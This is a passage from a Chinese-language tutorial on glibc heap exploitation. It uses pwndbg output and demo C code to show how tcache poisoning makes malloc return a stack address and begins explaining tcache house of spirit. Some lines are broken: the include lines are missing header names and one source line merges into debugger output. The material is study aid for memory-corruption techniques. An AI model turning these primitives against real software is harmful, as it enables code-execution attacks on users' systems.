    0x555555756250 PREV_INUSE {
      mchunk_prev_size = 0, 
      mchunk_size = 145, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
    0x5555557562e0 PREV_INUSE {
      mchunk_prev_size = 0, 
      mchunk_size = 134433, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
此时可能有同学会比较疑惑，我们明明只malloc了一个size为128的chunk为什么最前面有一个大小为0x251的chunk嘞,这个其实就是tcache_perthread_struct这个用来管理tcache的结构体
好了，解决了这个问题我们就继续下一步吧，让我们free掉a
    pwndbg> bins
    tcachebins
    0x90 [  1]: 0x555555756260 ◂— 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
可以看到此时我们的chunk a已经被放到了tcache中
此时我们所需要做的就极其简单了，因为tcache没有检查size是否符合规格这一设定，因此我们直接覆写chunk a 的fd指针，让他链在我们的free
list中
    pwndbg> bins
    tcachebins
    0x90 [  1]: 0x555555756260 —▸ 0x7fffffffe5c0 ◂— ...
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    pwndbg> x/10gx 0x555555756250
    0x555555756250:    0x0000000000000000    0x0000000000000091
    0x555555756260:    0x00007fffffffe5c0    0x0000000000000000
    0x555555756270:    0x0000000000000000    0x0000000000000000
    0x555555756280:    0x0000000000000000    0x0000000000000000
    0x555555756290:    0x0000000000000000    0x0000000000000000
此时我们只需要malloc一次就可以取出来了（开篇时有提及，tcache是先进后出的
    pwndbg> p/x b-2
    $1 = 0x7fffffffe5b0
    $2 = {
      mchunk_prev_size = 0x7fffffffe5e0, 
      mchunk_size = 0x555555554942, 
      fd = 0x5555555549a0, 
      bk = 0x555555756260, 
      fd_nextsize = 0x7fffffffe5c0, 
      bk_nextsize = 0xa9ab61495b094700
    }
    pwndbg> p/x stack_var
    $3 = 0x5555555549a0
    pwndbg>
###  总结
对于tcache poisoning来说，我们的利用极其简单
只需要free掉一个chunk放入tcache中，然后直接更改其fd指针，我们就可以任意地址malloc了
程序首先在栈上声明了一个变量，之后malloc了chunk a(size=128),此时free掉chunk a,a被链入到free list中
然后程序覆写了a的fd指针，将其指向了我们的栈指针
现在栈指针也被链入了我们的free list中
此时我们再malloc，因为不会检查size是否合法，就可以直接将我们的栈指针取出来了(先进后出)
## tcache_house_of_spirit
###  序
我们的tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针
###  源代码
    #include 
    #include 
    int main()
    {
        //本文件是通过tcache来利用house of sprirt技术的demo
        fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.n");
        //这个技术与原始的HOS利用方式相似，但我们不需要在fake chunk被free之后创建fake chunk
        fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.n");
        //我们可以看到在malloc.c中的_int_free调用tcach_put时并没有检查下一个chunk的szie和prev_inuse位是合理的
        fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.n");
        //搜索字符串"invalid next size"和"double free or corruption"
        fprintf(stderr, "(Search for strings "invalid next size" and "double free or corruption")nn");
        //好了，现在我们开始
        fprintf(stderr, "Ok. Let's start with the example!.nn");
        //先调用一次malloc来设置内存
        fprintf(stderr, "Calling malloc() once so that it sets up its memory.n");
        malloc(1);
        //想象一下，现在我们覆写一个指针来指向我们的fake chunk区域
        fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.n");
        unsigned long long *a; //pointer that will be overwritten
        unsigned long long fake_chunks[10]; //fake chunk region
        //该区域包括一个fake chunk
        fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %pn", &fake_chunks[1]);
        //此chunk的size必须在是符合tcache大小的即chunk的size要小于0x410，这也就意味着我们malloc的size要小于0x408(在x64位上。而我们的PREV_INUSE(lsb)位在tcache chunks中是被忽略了的，但是另外两个标志位会引发一些问题，他们是IS_MAPPED和NON_MAIN_ARENA
        fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size  heap
    0x555555757000 PREV_INUSE {
      mchunk_prev_size = 0, 
      mchunk_size = 593, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
    0x555555757250 FASTBIN {
      mchunk_prev_size = 0, 
      mchunk_size = 33, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x20d91
    }
    0x555555757270 PREV_INUSE {
      mchunk_prev_size = 0, 
      mchunk_size = 134545, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
如果不知道为什么size是33，可以复习一下glibc源码实现，这里即使malloc(0)也是可以得到同样效果的
然后我们让程序继续跑起来
现在我们有了两个野指针，分别在
    pwndbg> p/x &a
    $1 = 0x7fffffffe568
    pwndbg> p/x &fake_chunks
    $2 = 0x7fffffffe570
    pwndbg> p/x fake_chunks
    $3 = {0x9, 0x7ffff7dd7660, 0x7fffffffe5e8, 0xf0b5ff, 0x1, 0x555555554a6d, 0x7ffff7de59a0, 0x0, 0x555555554a20, 0x5555555546c0}
    pwndbg> p/x a
    $4 = 0x756e6547
现在我们给我们的fake chunk的size赋值为0x40，此时的fake_chunks
    pwndbg> p/x fake_chunks